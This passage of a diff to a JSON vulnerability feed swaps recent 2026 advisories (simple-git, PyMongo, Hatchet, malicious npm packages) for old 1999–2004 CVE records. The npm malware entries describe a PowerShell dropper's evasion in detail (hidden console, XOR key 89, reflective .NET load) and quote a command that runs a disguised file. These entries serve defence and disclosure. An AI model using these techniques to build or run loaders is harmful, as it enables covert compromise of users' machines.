Same class/impact as GHSA-jcxm-m3jx-f287, on the push path.\n\nRemediation: canonicalize git option abbreviations before matching (resolve to the canonical long name via the per-task flag spec in expandToken), or match on the option stem/prefix down to the shortest unambiguous form for push receive-pack/exec (mirroring the clone-side '--u' approach). Also audit --template and -c/config-write detection for the same abbreviation gap.\n\nCredit: anir0y (independent security research).",
-      "cvssScore": 8.1,
-      "severity": "High",
-      "published": "2026-10-05",
-      "modified": "2026-10-05",
-      "cwe": {
-        "cwe_id": "CWE-77",
-        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')"
-      },
-      "references": [
-        "https://github.com/steveukx/git-js/security/advisories/GHSA-858h-whjf-mvg5",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-102827",
-        "https://github.com/steveukx/git-js/pull/1193",
-        "https://github.com/steveukx/git-js/commit/98864c678444d9336357c844efa4fd5a7984c0d7",
-        "https://github.com/steveukx/git-js/releases/tag/simple-git@4.0.0"
-      ],
-      "vulnerableProducts": [
-        "simple-git npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-96749",
-      "summary": "An integer overflow in the BSON document encoding component of the MongoDB Python Driver's bundled native extension may occur when a single document is built from an unusually large amount of caller-supplied data. Size arithmetic is performed in a signed 32-bit type, and the guard meant to catch the overflow is written in a form whose behavior is not defined by the C language standard. A party with no privileges who can place a very large value into data that an application encodes may, depending on how the native extension was built, cause a write outside the bounds of an allocated buffer inside the application's own process.",
-      "cvssScore": 8.4,
-      "severity": "High",
-      "published": "2026-10-05",
-      "modified": "2026-10-05",
-      "cwe": {
-        "cwe_id": "CWE-190",
-        "name": "Integer Overflow or Wraparound"
-      },
-      "references": [
-        "https://github.com/mongodb/mongo-python-driver/security/advisories/GHSA-v4x9-3549-crwv",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-96749",
-        "https://github.com/mongodb/mongo-python-driver/pull/3066",
-        "https://github.com/mongodb/mongo-python-driver/commit/640dd2383a1a2fb1a10e5222d50ebc0b22a61bd7",
-        "https://github.com/mongodb/mongo-python-driver/commit/6ab44be0e97c9d1d5a23725c4978fb25f3249485"
-      ],
-      "vulnerableProducts": [
-        "pymongo pip"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-96748",
-      "summary": "### Summary\n\nPyMongo percent-decoded the entire host section of a connection string before splitting it into individual `host:port` entries. A percent-encoded `,` or `:` in a hostname therefore decoded into a real delimiter, injecting an additional attacker-chosen host and port into the client's seed list.\n\n### Impact\n\nAn application that interpolates untrusted input into a MongoDB connection string -- for example, a tenant name or hostname fragment taken from a request -- could be made to add an attacker-controlled server to the seed list. Because `%2C` and `%3A` survive most URL-safety checks and only become delimiters inside PyMongo's parser, input that looks like a single hostname to the application becomes two hosts to the driver. The client may then perform topology discovery and authentication against the attacker's host, exposing credentials, or route operations to it.\n\nUnix domain socket paths, the only host identifiers that legitimately require percent-encoding, are not affected.\n\n### Patches\n\nFixed in PyMongo 4.18.2. Percent-decoding was moved into `split_hosts` and now applies only to Unix domain socket paths, identified by an unescaped `.sock` suffix before decoding, and only after splitting on `,`.\n\n### Workarounds\n\nDo not interpolate untrusted input into the host portion of a connection string. If unavoidable, reject or percent-decode-and-validate the value before building the URI.\n\n### Details\n\nThe decoding was introduced in PyMongo 3.5.0 (PYTHON-1282), where `unquote_plus` was applied to the whole host section in `_validate_uri` and, later, `_parse_srv`, before the string was split on `,` and `:`.",
-      "cvssScore": 6.5,
-      "severity": "Medium",
-      "published": "2026-10-05",
-      "modified": "2026-10-05",
-      "cwe": {
-        "cwe_id": "CWE-177",
-        "name": "Improper Handling of URL Encoding (Hex Encoding)"
-      },
-      "references": [
-        "https://github.com/mongodb/mongo-python-driver/security/advisories/GHSA-vp6j-j7w5-5xjj",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-96748",
-        "https://github.com/mongodb/mongo-python-driver/pull/3066",
-        "https://github.com/mongodb/mongo-python-driver/commit/1e7a56db4649b14c4c9a6ac20aa4a8d0d1bb238a",
-        "https://github.com/mongodb/mongo-python-driver/commit/640dd2383a1a2fb1a10e5222d50ebc0b22a61bd7"
-      ],
-      "vulnerableProducts": [
-        "pymongo pip"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-96747",
-      "summary": "### Summary\n\nPyMongo passed the KMS endpoint of a data key verbatim into `parse_host()`, which returns any string ending in `.sock` unchanged instead of validating it as a hostname and port. The driver's connection code then treats such an address as a Unix domain socket path and connects to it with `AF_UNIX`. Because the endpoint originates from `masterKey.endpoint` in a key vault document, a party who can write to the key vault could redirect the driver's KMS connection to an arbitrary Unix domain socket path on the application host.\n\n### Impact\n\nAn application using client-side field level encryption (CSFLE) or Queryable Encryption is affected if an attacker can write to its key vault collection. Setting `masterKey.endpoint` on a data key to a `.sock`-suffixed string causes the next KMS request for that key (key cache TTL is ~60 seconds) to open an `AF_UNIX` connection to the attacker-chosen filesystem path from inside the victim application process. The documented custom KMS endpoint feature supports TCP hosts only, so this crosses a boundary the feature was never intended to allow.\n\nImpact is limited to the side effects of the connection itself. The socket is still wrapped in a verifying TLS context using the `.sock` string as `server_hostname`, and insecure KMS TLS options are rejected, so the handshake always fails and the KMS message is never sent. The attacker controls the connect target but not the transmitted bytes (a fixed TLS ClientHello).\n\nApplications that do not use CSFLE or Queryable Encryption are not affected. Applications whose key vault is not writable by untrusted parties are not affected.\n\n### Patches\n\nFixed in PyMongo 4.18.2 `_EncryptionIO.kms_request` now rejects a `.sock`-suffixed KMS endpoint with `pymongo.errors.ConfigurationError` immediately after parsing, before any connection is attempted, on both the synchronous and asynchronous paths. No application code changes are required beyond upgrading.\n\n### Workarounds\n\nIf you cannot upgrade immediately:\n\n- Restrict write access to the key vault collection to trusted principals only. This is the recommended configuration regardless of this issue.\n- Validate `masterKey.endpoint` on data keys you create, and audit existing key vault documents for endpoints ending in `.sock`.\n\n### Details\n\n- `_EncryptionIO.fetch_keys` reads key vault documents from the server and hands them to libmongocrypt, which surfaces the stored `masterKey.endpoint` verbatim as `kms_context.endpoint`.\n- `_EncryptionIO.kms_request` passed that string to `parse_host(endpoint, 443)`. `parse_host` returns entities ending in `.sock` verbatim, skipping the hostname and port validation applied to every other input.\n- `_create_connection` (and the async equivalent) checks `host.endswith(\".sock\")` and performs an `AF_UNIX` `sock.connect(host)`, treating the string as a filesystem path.",
+      "id": "CVE-2000-0034",
+      "summary": "Netscape 4.7 records user passwords in the preferences.js file during an IMAP or POP session, even if the user has not enabled \"remember passwords.\"",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2026-10-05",
-      "modified": "2026-10-05",
-      "cwe": {
-        "cwe_id": "CWE-20",
-        "name": "Improper Input Validation"
-      },
-      "references": [
-        "https://github.com/mongodb/mongo-python-driver/security/advisories/GHSA-qx36-8mw2-4r3x",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-96747",
-        "https://github.com/mongodb/mongo-python-driver/pull/3066",
-        "https://github.com/mongodb/mongo-python-driver/commit/44119d0f9dfa0224d84b03be702a6d9a5ef1dea7",
-        "https://github.com/mongodb/mongo-python-driver/commit/640dd2383a1a2fb1a10e5222d50ebc0b22a61bd7"
-      ],
-      "vulnerableProducts": [
-        "pymongo pip"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "GHSA-4PG5-WVV5-W7FG",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nThe tarball ships ten identical files with misleading extensions (1.png, client.doc, json.txt, server.doc, for.you.doc,.txt,.txt.1,.txt.2, and an extensionless 'client'), all sharing the same SHA-256 and all containing the same PowerShell script. The script hides its console window and moves it off-screen via SetWindowPos, concatenates roughly 150 base64 chunks, XOR-decodes them, and passes the resulting bytes to System.Reflection.Assembly.Load().Invoke — an in-memory.NET assembly loader characteristic of RAT/stealer stagers. The package has no index.js, no main entry, and no lifecycle scripts, so `npm install` and `require()` do not themselves run the loader; the package exists purely to deliver and disguise the staged PowerShell/.NET payload for later execution on the host.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-10-05",
-      "modified": "2026-10-06",
+      "published": "1999-12-22",
+      "modified": null,
       "cwe": null,
       "references": [
-        "https://github.com/advisories/GHSA-4pg5-wvv5-w7fg",
-        "https://www.npmjs.com/package/serpacksven2/v/1.0.0"
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-2000-0034",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-2000-0034"
       ],
-      "vulnerableProducts": [
-        "serpacksven2 npm"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "GHSA-696V-RR55-26PC",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nThe tarball ships no JavaScript — the declared `main: index.js` is absent — and contains only 10 byte-identical copies of a PowerShell dropper under misleading extensions (`1.png`, `client.doc`, `client.doc.1`, `json.txt`, extensionless `client`, all sha256 e9dff494...). The script hides the console window via Win32 APIs, concatenates ~150 base64 chunks, XOR-decodes them with single-byte key 89, reflectively resolves `[System.Reflection.Assembly].Load` through char-code-obfuscated type strings, and invokes the decoded in-memory.NET assembly. The package has no lifecycle scripts and no importable surface, so `npm install` alone does not execute the payload; the harm fires when a second-stage tool or downstream workflow sources any of the disguised files (e.g. `powershell -File client.doc`), delivering full-host code execution of an attacker-controlled.NET assembly on Windows. The multi-extension disguise, byte-identical duplication, and absence of any legitimate package content show this is a payload-staging artifact published to npm rather than a software package.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-10-05",
-      "modified": "2026-10-06",
-      "cwe": null,
-      "references": [
-        "https://github.com/advisories/GHSA-696v-rr55-26pc",
-        "https://www.npmjs.com/package/serpacksven1/v/1.0.6"
-      ],
-      "vulnerableProducts": [
-        "serpacksven1 npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "GHSA-297H-8M5X-925P",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nThe tarball contains only package.json and json.txt. The declared main (index.js) is absent, so requiring the package fails — the package is not a functional JS library. json.txt is a heavily obfuscated PowerShell script that hides the console window via GetConsoleWindow + ShowWindow(0) and SetWindowPos to offscreen coordinates (-32000,-32000), performs randomized sleeps and junk-variable noise, concatenates ~150 base64 string fragments into one buffer, base64-decodes and XOR-decrypts it with key 89, then reflectively loads the decoded bytes as a.NET assembly through a runtime-constructed [System.Reflection.Assembly]::Load invocation whose type and method names are rebuilt from char-code arithmetic. The in-memory.NET payload is opaque and attacker-controlled. The package has no lifecycle scripts, so installation alone does not execute json.txt, but any environment that invokes the shipped file via powershell will run the embedded payload. The disguised.txt extension, cover-story main entry, console-hiding, anti-analysis obfuscation, and reflective load of an opaque buffer are the signature of a malware staging artifact rather than legitimate tooling.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-10-05",
-      "modified": "2026-10-06",
-      "cwe": null,
-      "references": [
-        "https://github.com/advisories/GHSA-297h-8m5x-925p",
-        "https://www.npmjs.com/package/serpacksven/v/1.0.1",
-        "https://www.npmjs.com/package/serpacksven/v/1.0.0",
-        "https://www.npmjs.com/package/serpacksven/v/1.0.4",
-        "https://www.npmjs.com/package/serpacksven/v/1.0.2"
-      ],
-      "vulnerableProducts": [
-        "serpacksven npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0229",
-      "summary": "Safe Mode feature (safe_mode) in PHP 3.0 through 4.1.0 allows attackers with access to the MySQL database to bypass Safe Mode access restrictions and read arbitrary files using \"LOAD DATA INFILE LOCAL\" SQL statements.",
+      "id": "CVE-1999-0923",
+      "summary": "Sample runnable code snippets in ColdFusion Server 4.0 allow remote attackers to read files, conduct a denial of service, or use the server as a proxy for other HTTP calls.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2002-05-16",
+      "published": "2001-03-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=101286577109716&w=2",
-        "http://marc.info/?l=bugtraq&m=101304702002321&w=2",
-        "http://marc.info/?l=ntbugtraq&m=101285016125377&w=2",
-        "http://marc.info/?l=ntbugtraq&m=101303065423534&w=2",
-        "http://marc.info/?l=ntbugtraq&m=101303819613337&w=2"
+        "http://www.allaire.com/handlers/index.cfm?ID=8739&Method=Full",
+        "http://www.allaire.com/handlers/index.cfm?ID=8739&Method=Full"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-0230",
-      "summary": "Cross-site scripting vulnerability in fom.cgi of Faq-O-Matic 2.712 allows remote attackers to execute arbitrary Javascript on other clients via the cmd parameter, which causes the script to be inserted into an error message.",
+      "id": "CVE-1999-0924",
+      "summary": "The Syntax Checker in ColdFusion Server 4.0 allows remote attackers to conduct a denial of service.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2002-05-16",
+      "published": "2001-03-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=101285834018701&w=2",
-        "http://marc.info/?l=bugtraq&m=101293973111873&w=2",
-        "http://sourceforge.net/mailarchive/forum.php?thread_id=464940&forum_id=6367",
-        "http://www.debian.org/security/2002/dsa-109",
-        "http://marc.info/?l=bugtraq&m=101285834018701&w=2"
+        "http://www.allaire.com/handlers/index.cfm?ID=8739&Method=Full",
+        "http://www.osvdb.org/3236",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/1742",
+        "http://www.allaire.com/handlers/index.cfm?ID=8739&Method=Full",
+        "http://www.osvdb.org/3236"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-0231",
-      "summary": "Buffer overflow in mIRC 5.91 and earlier allows a remote server to execute arbitrary code on the client via a long nickname.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-05-16",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=101286747013955&w=2",
-        "http://online.securityfocus.com/archive/1/254105",
-        "http://www.iss.net/security_center/static/8083.php",
-        "http://www.securityfocus.com/bid/4027",
-        "http://www.uuuppz.com/research/adv-001-mirc.htm"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1056",
-      "summary": "Microsoft Outlook 2000 and 2002, when configured to use Microsoft Word as the email editor, does not block scripts that are used while editing email messages in HTML or Rich Text Format (RTF), which could allow remote attackers to execute arbitrary scripts via an email that the user forwards or replies to.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-05-16",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=101760380418890&w=2",
-        "http://online.securityfocus.com/archive/1/265621",
-        "http://www.iss.net/security_center/static/8708.php",
-        "http://www.securityfocus.com/bid/4397",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-021"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1280",
-      "summary": "Memory leak in RealSecure Event Collector 6.5 allows attackers to cause a denial of service (memory consumption and crash).",
+      "id": "CVE-1999-0945",
+      "summary": "Buffer overflow in Internet Mail Service (IMS) for Microsoft Exchange 5.5 and 5.0 allows remote attackers to conduct a denial of service via AUTH or AUTHINFO commands.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2002-05-17",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.isskk.co.jp/support/XPressUpdates/RS/RS65ECSR15RNj.html",
-        "http://www.isskk.co.jp/support/XPressUpdates/RS/RS65ECSR15RNj.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-1334",
-      "summary": "Block_render_url.class in PHPSlash 0.6.1 allows remote attackers with PHPSlash administrator privileges to read arbitrary files by creating a block and specifying the target file as the source URL.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2002-05-19",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2001-05/0126.html",
-        "http://marc.info/?l=phpslash&m=99029398904419&w=2",
-        "http://www.iss.net/security_center/static/9990.php",
-        "http://www.securityfocus.com/bid/2724",
-        "http://archives.neohapsis.com/archives/bugtraq/2001-05/0126.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-61687",
-      "summary": "### Summary\n\nHatchet version v0.86.26 and below is vulnerable to OAuth state CSRF (login CSRF / account fixation). \n\nThe vulnerable code clears the session `oauth_state_<integration>` value to the empty string `\"\"` after a successful OAuth callback rather than removing the key, and the subsequent state-equality check then accepts an empty `?state=` parameter on any later callback request — allowing an unauthenticated attacker to bind an already-authenticated victim's session cookie to an attacker-controlled OAuth identity (account takeover via login-CSRF). \n\n### Impact\n\nAffected configurations: any deployment that has enabled at least one of `auth.google.enabled`, `auth.github.enabled`, or the Slack integration, and where the victim has completed at least one OAuth flow on that integration in the current session. Bug present on `main` HEAD and in every tagged release up to and including v0.86.26 (commit `243f41d9e1161e70d47dfc0a6509f1c4ddfc9c23`).",
-      "cvssScore": 7.1,
-      "severity": "High",
-      "published": "2026-09-21",
-      "modified": "2026-09-21",
-      "cwe": {
-        "cwe_id": "CWE-287",
-        "name": "Improper Authentication"
-      },
-      "references": [
-        "https://github.com/hatchet-dev/hatchet/security/advisories/GHSA-phg3-3g28-wq9v",
-        "https://github.com/hatchet-dev/hatchet/commit/f90464189ad642251e09412d0f99fde353036428",
-        "https://github.com/advisories/GHSA-phg3-3g28-wq9v"
-      ],
-      "vulnerableProducts": [
-        "hatchet go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1212",
-      "summary": "Zope 2.2.0 through 2.2.4 does not properly protect a data updating method on Image and File objects, which allows attackers with DTML editing privileges to modify the raw data of these objects.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2000-12-18",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000365",
-        "http://frontal2.mandriva.com/security/advisories?name=MDKSA-2000:086",
-        "http://www.debian.org/security/2001/dsa-007",
-        "http://www.osvdb.org/6283",
-        "http://www.redhat.com/support/errata/RHSA-2000-135.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0969",
-      "summary": "Buffer overflow in MySQL daemon (mysqld) before 3.23.50, and 4.0 beta before 4.02, on the Win32 platform, allows local users to execute arbitrary code via a long \"datadir\" parameter in the my.ini initialization file, whose permissions on Windows allow Full Control to the Everyone group.",
-      "cvssScore": 7.8,
-      "severity": "High",
-      "published": "2002-10-11",
+      "published": "2001-03-12",
       "modified": null,
       "cwe": "CWE-120",
       "references": [
-        "http://archives.neohapsis.com/archives/vulnwatch/2002-q4/0004.html",
-        "http://marc.info/?l=bugtraq&m=103358628011935&w=2",
-        "http://www.iss.net/security_center/static/10243.php",
-        "http://www.mysql.com/documentation/mysql/bychapter/manual_News.html#News-3.23.x",
-        "http://www.securityfocus.com/bid/5853"
+        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ169174",
+        "http://www.ciac.org/ciac/bulletins/i-080.shtml",
+        "http://xforce.iss.net/alerts/advise4.php",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/1223",
+        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ169174"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-1137",
-      "summary": "Buffer overflow in the Database Console Command (DBCC) that handles user inputs in Microsoft SQL Server 7.0 and 2000, including Microsoft Data Engine (MSDE) 1.0 and Microsoft Desktop Engine (MSDE) 2000, allows attackers to execute arbitrary code via a long SourceDB argument in a \"non-SQL OLEDB data source\" such as FoxPro, a variant of CAN-2002-0644.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-10-11",
+      "id": "CVE-2000-0306",
+      "summary": "Buffer overflow in calserver in SCO OpenServer allows remote attackers to gain root access via a long message.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2001-03-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.ciac.org/ciac/bulletins/n-003.shtml",
-        "http://www.cisco.com/warp/public/707/cisco-sa-20030126-ms02-061.shtml",
-        "http://www.scan-associates.net/papers/foxpro.txt",
-        "http://www.securityfocus.com/bid/5877",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-056"
+        "ftp://ftp.sco.com/SSE/security_bulletins/SB-99.02a",
+        "http://www.securityfocus.com/templates/archive.pike?list=1&date=1998-12-29&msg=AAh6GYsGU1%40leshka.chuvashia.su",
+        "ftp://ftp.sco.com/SSE/security_bulletins/SB-99.02a",
+        "http://www.securityfocus.com/templates/archive.pike?list=1&date=1998-12-29&msg=AAh6GYsGU1%40leshka.chuvashia.su"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0680",
-      "summary": "Windows NT Terminal Server performs extra work when a client opens a new connection but before it is authenticated, allowing for a denial of service.",
+      "id": "CVE-2004-2019",
+      "summary": "The WebLinks module in Php-Nuke 6.x through 7.3 allows remote attackers to obtain sensitive information via an invalid show parameter, which displays the full path in a PHP error message.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "1999-08-09",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=108482957715299&w=2",
+        "http://secunia.com/advisories/11625",
+        "http://www.securityfocus.com/bid/10367",
+        "http://www.waraxe.us/index.php?modname=sa&id=29",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16170"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0257",
+      "summary": "Cross-site scripting vulnerability in auction.pl of MakeBid Auction Deluxe 3.30 allows remote attackers to obtain information from other users via the form fields (1) TITLE, (2) DESCTIT, (3) DESC, (4) searchstring, (5) ALIAS, (6) EMAIL, (7) ADDRESS1, (8) ADDRESS2, (9) ADDRESS3, (10) PHONE1, (11) PHONE2, (12) PHONE3, or (13) PHONE4.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-05-29",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=101328880521775&w=2",
+        "http://www.iss.net/security_center/static/8161.php",
+        "http://www.netcreations.addr.com/dcforum/DCForumID2/126.html",
+        "http://www.securityfocus.com/bid/4069",
+        "http://marc.info/?l=bugtraq&m=101328880521775&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0258",
+      "summary": "Merak Mail IceWarp Web Mail uses a static identifier as a user session ID that does not change across sessions, which could allow remote attackers with access to the ID to gain privileges as that user, e.g. by extracting the ID from the user's answer or forward URLs.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-05-29",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=101328887821909&w=2",
+        "http://marc.info/?l=bugtraq&m=101328887821909&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0259",
+      "summary": "InstantServers MiniPortal 1.1.5 and earlier stores sensitive login and account data in plaintext in (1) .pwd files in the miniportal/apache directory, or (2) mplog.txt, which could allow local users to gain privileges.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2002-05-29",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=101329397901071&w=2",
+        "http://www.instantservers.com/releases.html",
+        "http://www.iss.net/security_center/static/8170.php",
+        "http://www.securityfocus.com/bid/4076",
+        "http://marc.info/?l=bugtraq&m=101329397901071&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0260",
+      "summary": "Buffer overflow in InstantServers MiniPortal 1.1.5 and earlier allows remote attackers to execute arbitrary code via a long login name, which is not properly handled by the logging utility.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-05-29",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=101329397901071&w=2",
+        "http://www.instantservers.com/releases.html",
+        "http://www.iss.net/security_center/static/8172.php",
+        "http://www.securityfocus.com/bid/4073",
+        "http://marc.info/?l=bugtraq&m=101329397901071&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0261",
+      "summary": "Directory traversal vulnerability in InstantServers MiniPortal 1.1.5 and earlier allows remote authenticated users to read arbitrary files via a ... (modified dot dot) in the GET command.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-05-29",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=101329397901071&w=2",
+        "http://www.instantservers.com/releases.html",
+        "http://www.iss.net/security_center/static/8171.php",
+        "http://www.securityfocus.com/bid/4075",
+        "http://marc.info/?l=bugtraq&m=101329397901071&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0262",
+      "summary": "Directory traversal vulnerability in netget for Sybex E-Trainer web server allows remote attackers to read arbitrary files via a .. (dot dot) in the file parameter.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-05-29",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=101344812311216&w=2",
+        "http://www.iss.net/security_center/static/8175.php",
+        "http://www.securityfocus.com/bid/4071",
+        "http://marc.info/?l=bugtraq&m=101344812311216&w=2",
+        "http://www.iss.net/security_center/static/8175.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0537",
+      "summary": "HTTP server for Cisco IOS 11.3 to 12.2 allows attackers to bypass authentication and execute arbitrary commands, when local authorization is being used, by specifying a high access level in the URL.",
+      "cvssScore": 9.3,
+      "severity": "Critical",
+      "published": "2001-07-21",
       "modified": null,
       "cwe": "CWE-287",
       "references": [
-        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ238600",
-        "http://www.ciac.org/ciac/bulletins/j-057.shtml",
-        "http://www.securityfocus.com/bid/571",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/1999/ms99-028",
-        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ238600"
+        "http://www.cert.org/advisories/CA-2001-14.html",
+        "http://www.ciac.org/ciac/bulletins/l-106.shtml",
+        "http://www.cisco.com/warp/public/707/IOS-httplevel-pub.html",
+        "http://www.osvdb.org/578",
+        "http://www.securityfocus.com/archive/1/1601227034.20010702112207%40olympos.org"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0813",
-      "summary": "Cfingerd with ALLOW_EXECUTION enabled does not properly drop privileges when it executes a program on behalf of the user, allowing local users to gain root privileges.",
-      "cvssScore": 7.2,
+      "id": "CVE-2001-1257",
+      "summary": "Cross-site scripting vulnerability in Horde Internet Messaging Program (IMP) before 2.2.6 and 1.2.6 allows remote attackers to execute arbitrary Javascript embedded in an email.",
+      "cvssScore": 7.5,
       "severity": "High",
-      "published": "1999-08-10",
+      "published": "2001-07-21",
       "modified": null,
       "cwe": null,
       "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0813",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0813"
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000410",
+        "http://online.securityfocus.com/archive/1/198495",
+        "http://online.securityfocus.com/archive/1/198495",
+        "http://online.securityfocus.com/archive/1/198495",
+        "http://online.securityfocus.com/archive/1/198495"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0694",
-      "summary": "Denial of service in AIX ptrace system call allows local users to crash the system.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "1999-08-11",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.ciac.org/ciac/bulletins/j-055.shtml",
-        "http://www.ciac.org/ciac/bulletins/j-055.shtml"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0814",
-      "summary": "Red Hat pump DHCP client allows remote attackers to gain root access in some configurations.",
+      "id": "CVE-2000-1047",
+      "summary": "Buffer overflow in SMTP service of Lotus Domino 5.0.4 and earlier allows remote attackers to cause a denial of service and possibly execute arbitrary commands via a long ENVID keyword in the \"MAIL FROM\" command.",
       "cvssScore": 10,
       "severity": "Critical",
-      "published": "1999-08-11",
+      "published": "2000-12-11",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.redhat.com/support/errata/RHSA-1999-027.html",
-        "http://www.redhat.com/support/errata/RHSA-1999-027.html"
+        "http://www.osvdb.org/442",
+        "http://www.securityfocus.com/archive/1/143071",
+        "http://www.securityfocus.com/bid/1905",
